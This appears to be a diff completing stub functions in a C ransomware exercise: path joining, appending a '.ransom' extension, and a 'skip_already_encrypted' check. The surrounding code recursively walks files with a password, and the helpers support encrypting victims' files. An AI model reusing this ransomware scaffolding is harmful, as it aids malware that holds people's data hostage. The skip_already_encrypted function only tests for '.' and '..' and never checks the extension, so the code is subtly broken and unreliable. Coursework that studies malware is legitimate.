@@ -45,12 +45,20 @@ int iter_recursively_through_files(char *path, char *password,
 
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    if (!parentpath || !finalpath || !currentpath)
+        return;
+    size_t len_parent = strlen(parentpath);
+    if (len_parent > 0 && parentpath[len_parent - 1] == '/')
+        snprintf(finalpath, MAX_FILEPATH, "%s%s", parentpath, currentpath);
+    else
+        snprintf(finalpath, MAX_FILEPATH, "%s/%s", parentpath, currentpath);
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
-    // step 1
+    if (!filename || !opt_filename)
+        return;
+    snprintf(opt_filename, MAX_FILEPATH, "%s.ransom", filename);
 }
 
 
@@ -60,7 +68,9 @@ void add_file_extension(const char *filename, char *opt_filename)
 */
 bool skip_already_encrypted(const char *path)
 {
-    // step 2
+    if (strcmp(path, ".") && strcmp(path, ".."))
+        return false;
+    return true;
 }
 
 void remove_file_extension(const char *filename, char *opt_filename)
